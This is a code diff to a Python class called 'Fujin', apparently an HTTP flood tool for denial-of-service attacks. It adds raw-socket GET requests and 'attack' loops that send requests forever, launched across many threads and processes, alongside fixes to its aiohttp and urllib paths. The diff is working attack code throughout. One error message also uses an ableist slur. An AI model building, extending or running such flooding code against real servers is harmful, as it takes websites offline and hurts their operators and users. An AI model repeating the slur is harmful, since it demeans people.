@@ -7,6 +7,8 @@ import multiprocessing
 import asyncio
 import sys
 import urllib3
+from urllib.parse import urlparse
+
 
 class Fujin:
 
@@ -52,9 +54,10 @@ class Fujin:
         self.closing_message = closing_message
         self.caching = caching
 
-        # Sessions and object to
+        # Sessions
+        # AIOHTTP Can be initialised outside but it doesnt work properly if you do
+        # Socket doesn't have a Pooling or Session Manager all of the socket requests are built from scratch 
         self.session = requests.session()
-        self.aiohttp_session = aiohttp.ClientSession()
         self.urllib_session = urllib3.PoolManager()
 
         # Other
@@ -65,6 +68,8 @@ class Fujin:
         self.aio = ['aiohttp', 'Aiohttp', 'AIOHTTP']
         self.requests = ['requests', 'Requests', 'REQUESTS']
         self.urllib = ['urllib', 'URLLIB', 'urllib3', 'URLLIB3', 'Urllib', 'Urllib3']
+        self.sock = ['socket', 'Socket', 'SOCKET']
+
 
 
 
@@ -84,10 +89,6 @@ class Fujin:
                 self.session.close()
                 print("Requests Session Closed")
 
-                # Close AIOHTTP Session
-                asyncio.run(self.aiohttp_session.close())
-                print("AIOHTTP Session Closed")
-
                 # URLLIB3 PoolManager
                 self.urllib_session.clear()
                 print("URLLIB Session Closed\n\n\n")
@@ -100,7 +101,6 @@ class Fujin:
         else:
             try:
                 self.session.close()
-                asyncio.run(self.aiohttp_session.close())
                 self.urllib_session.clear()
             except Exception as e:
                 print(f"\n\n{e}\n\n")
@@ -118,10 +118,6 @@ class Fujin:
                 self.session.close()
                 print("Requests Session Closed")
 
-                # Close AIOHTTP Session
-                asyncio.run(self.aiohttp_session.close())
-                print("AIOHTTP Session Closed")
-
                 # URLLIB3 PoolManager
                 self.urllib_session.clear()
                 print("URLLIB Session Closed\n\n\n")
@@ -134,18 +130,71 @@ class Fujin:
         else:
             try:
                 self.session.close()
-                asyncio.run(self.aiohttp_session.close())
                 self.urllib_session.clear()
             except Exception as e:
                 print(f"\n\n{e}\n\n")
                 sys.exit(0)
 
+
+
+
+        
+    #
+    # Utility
+    #
+    def build_http_request(self, url: str | None = None, headers: dict | None = None):
+        """
+        Builds HTTP Requests for you. 
+
+        Takes URL and Headers
+        """
+
+        parsed_url = urlparse(url)
+        protocol = parsed_url.scheme
+        hostname = parsed_url.hostname
+        path = parsed_url.path
+        query = parsed_url.query
+
+        if protocol == "http":
+            port = 80
+        elif protocol == "https":
+            port = 443
+        else:
+            raise ValueError("Unsupported protocol")
+
+        # Construct the request
+        request = f"GET {path}?{query} HTTP/1.1\r\n"
+        request += f"Host: {hostname}\r\n"
+
+        if headers:
+            for key, value in headers.items():
+                request += f"{key}: {value}\r\n"
+
+        request += "Connection: close\r\n"
+        request += "\r\n"
+
+        return hostname, port, request
     
+
+    def get_status_code(self, response):
+        """
+        Mainly for the Socket Requests
+
+        Quickly Skims through the first line of the response for our Response Code to then get put in the object.status variable
+        """
+        status_line = response.split(b'\r\n')[0].decode('utf-8')
+        status_code = status_line.split()[1]
+        return status_code
+
+    
+
 
 
     #
     # Async and Sync GET Requests
     #
+
+    ### REQUESTS GET REQUEST CALLS ###
     async def async_get(self) -> None:
         """
         A Normal GET request that uses the 'requests' module
@@ -196,6 +245,7 @@ class Fujin:
         print(f"{self.result}")
 
     
+    ### AIOHTTP GET REQUEST CALLS ###
     async def aio_async_get(self) -> None:
         """
         Aynschronous Version
@@ -203,35 +253,118 @@ class Fujin:
         Sends a GET Request with the AIOHTTP ClientSession Class
         """
 
-        r = self.aiohttp_session.get(self.url, headers=self.header, ssl=False)
-        self.connected += 1
-        self.result = self.connected
-        print(f"{self.result}")
+        try:
+            async with aiohttp.ClientSession() as session:
+                async with session.get(self.url) as sesh:
+                    self.connected += 1
+                    self.status = sesh.status
+                    self.result = self.connected, self.status
+                    print(f"{self.result}")
+        except Exception as e:
+            print(f"Error: {e}")
+            self.close_sessions()
 
 
+    ### URLLIB GET REQUEST CALLS ###
     async def urllib_async_get(self) -> None:
 
-        r = self.urllib_session.request(url=self.url, headers=self.header, method='GET')
-        self.connected += 1
-        self.status_code = r.status
-        self.result = self.connected, self.status_code
-        print(f"{self.result}")
+        try:
+            r = self.urllib_session.request(url=self.url, headers=self.header, method='GET')
+            self.connected += 1
+            self.status_code = r.status
+            self.result = self.connected, self.status_code
+            print(f"{self.result}")
+        except Exception as e:
+            print(f"Error: {e}")
+            self.close_sessions()
 
     async def urllib_sync_get(self) -> None:
+        """
+        Synchronous
 
-        r = self.urllib_session.request(url=self.url, headers=self.header, method='GET')
-        self.connected += 1
-        self.status_code = r.status
-        self.result = self.connected, self.status_code
-        print(f"{self.result}")
+        URLLIB Module
+
+        Just sends a Simple GET request
+        """
+
+        try:
+            r = self.urllib_session.request(url=self.url, headers=self.header, method='GET')
+            self.connected += 1
+            self.status_code = r.status
+            self.result = self.connected, self.status_code
+            print(f"{self.result}")
+        except Exception as e:
+            print(f"Error: {e}")
+            self.close_sessions()
     
 
+    ### SOCKET GET REQUEST CALLS ###
+    def socket_sync_get(self) -> None:
+        """
+        Socket Synchronous Get Request
+
+        Utilises the socket module, constructs the HTTP Request from scratch utilising multi-line strings.
+        Encodes and Sends Data while send it back
+        """
+
+        try:
+            hostname, port, request = self.build_http_request(url=self.url, headers=self.header)
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.connect((hostname, port))
+                s.sendall(request.encode())
+
+                # Receive the response
+                response = b""
+                while 1:
+                    data = s.recv(4096)
+                    if not data: break
+                    response += data
+
+            self.connected += 1
+            self.status = self.get_status_code(response=response)
+            self.result = self.connected, self.status
+            print(f"{self.result}")
+        except Exception as e:
+            print(f"Error: {e}")
+            self.close_sessions()
+
+    async def socket_async_get(self) -> None:
+        """
+        Socket Synchronous Get Request
+
+        Utilises the socket module, constructs the HTTP Request from scratch utilising multi-line strings.
+        Encodes and Sends Data while send it back
+        """
+
+        try:
+            hostname, port, request = self.build_http_request(url=self.url, headers=self.header)
+
+            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+            s.connect((hostname, port))
+            s.sendall(request.encode())
+
+            # Receive the response
+            response = b""
+            while 1:
+                data = s.recv(4096)
+                if not data: break
+                response += data
+
+            self.connected += 1
+            self.status = self.get_status_code(response=response)
+            self.result = self.connected, self.status
+            print(f"{self.result}")
+        except Exception as e:
+            print(f"Error: {e}")
+            self.close_sessions()
+
+
+    
 
 
     #
     # Infinite loops for Async and Sync functions
     #
-
 
     ### Requests Session ###
     def begin_async_get_attack(self) -> None:   
@@ -328,6 +461,32 @@ class Fujin:
             self.close_sessions()
 
 
+    ### SOCKET ###
+    def begin_socket_sync_attack(self) -> None:
+        """
+        while 1:
+            self.socket_sync_get()
+        """
+        try:
+            while 1:
+                self.socket_sync_get()
+        except KeyboardInterrupt:
+            self.close_sessions
+        except Exception as e:
+            print(f"Error: {e}")
+            self.close_sessions()
+
+    def begin_socket_async_attack(self) -> None:
+        try:
+            while 1:
+                asyncio.run(self.socket_async_get())
+        except Exception as e:
+            print(f"Error: {e}")
+            self.close_sessions()
+        except KeyboardInterrupt:
+            self.close_sessions()
+
+
     
 
 
@@ -347,6 +506,7 @@ class Fujin:
         1. Requests
         2. Aiohttp
         3. Urllib3
+        4. Socket
         """
 
         # If parameter is left blank/empty just turn on Daemon on they're going to get spammed with messages
@@ -382,6 +542,15 @@ class Fujin:
             for x in range(threads):
                 self.async_threads[x].join()
 
+        # Socket Requests (scratch)
+        elif pooling_manager in self.sock:
+            for x in range(threads):
+                t=threading.Thread(target=self.begin_socket_async_attack, name=thread_name, daemon=daemon)
+                t.start()
+                self.async_threads.append(t)
+            for x in range(threads):
+                self.async_threads[x].join()
+
         # Friendly Message
         else:
             print("Choose a window manager ya retard")
@@ -400,6 +569,7 @@ class Fujin:
 
         1. Requests
         2. Pooling Manager
+        3. Socket
         """
 
         # If parameter is left empty then turn on daemon
@@ -425,7 +595,16 @@ class Fujin:
         # URLLIB Pooling Manager
         elif pooling_manager in self.urllib:
             for x in range(threads):
-                t = threading.Thread(target=self.begin_aio_sync_attack, name=thread_name, daemon=daemon)
+                t = threading.Thread(target=self.begin_urllib_sync_attack, name=thread_name, daemon=daemon)
+                t.start()
+                self.async_threads.append(t)
+            for x in range(threads):
+                self.async_threads[x].join()
+
+        # Socket Requests (scratch)
+        elif pooling_manager in self.sock:
+            for x in range(threads):
+                t=threading.Thread(target=self.begin_socket_sync_attack, name=thread_name, daemon=daemon)
                 t.start()
                 self.async_threads.append(t)
             for x in range(threads):
@@ -453,6 +632,7 @@ class Fujin:
 
         1. Requests
         2. Pooling Manager
+        3. Socket
         """
 
         # Rename the variable so I can easily write :)))
@@ -469,21 +649,32 @@ class Fujin:
             for x in range(numproc):
                 p = multiprocessing.Process(target=self.begin_sync_get_attack, name=thread_name, daemon=daemon)
                 p.start()
-                self.async_processes.append(p)
+                self.sync_processes.append(p)
             for x in range(numproc):
-                self.async_processes[x].join()
+                self.sync_processes[x].join()
 
+        # AIOHTTP only works with asynchronous functions
         elif pooling_manager in self.aio:
             print("Error: AIOHTTP does not work with Synchronous Functions.")
             self.close_sessions()
 
+        # URLLIB3 Pooling Manager
         elif pooling_manager in self.urllib:
             for x in range(numproc):
                 p = multiprocessing.Process(target=self.begin_urllib_sync_attack, name=thread_name, daemon=daemon)
                 p.start()
-                self.async_processes.append(p)
+                self.sync_processes.append(p)
             for x in range(numproc):
-                self.async_processes[x].join()
+                self.sync_processes[x].join()
+
+        # Socket HTTP Requests
+        elif pooling_manager in self.sock:
+            for x in range(numproc):
+                p=multiprocessing.Process(target=self.begin_socket_sync_attack, name=thread_name, daemon=daemon)
+                p.start()
+                self.sync_processes.append(p)
+            for x in range(numproc):
+                self.sync_processes[x].join()
 
         # Friendly message to people who would not like to use it
         else:
@@ -506,6 +697,7 @@ class Fujin:
         1. Requests
         2. Aiohttp
         3. Pooling Manager
+        4. Socket
         """
         
         # Rewrite the var so i can easy write :)))
@@ -539,6 +731,15 @@ class Fujin:
         elif pooling_manager in self.urllib:
             for x in range(numproc):
                 p = multiprocessing.Process(target=self.begin_urllib_async_attack, name=thread_name, daemon=daemon)
+                p.start()
+                self.async_processes.append(p)
+            for x in range(numproc):
+                self.async_processes[x].join()
+
+        # Socket HTTP Requests
+        elif pooling_manager in self.sock:
+            for x in range(numproc):
+                p=multiprocessing.Process(target=self.begin_socket_async_attack, name=thread_name, daemon=daemon)
                 p.start()
                 self.async_processes.append(p)
             for x in range(numproc):
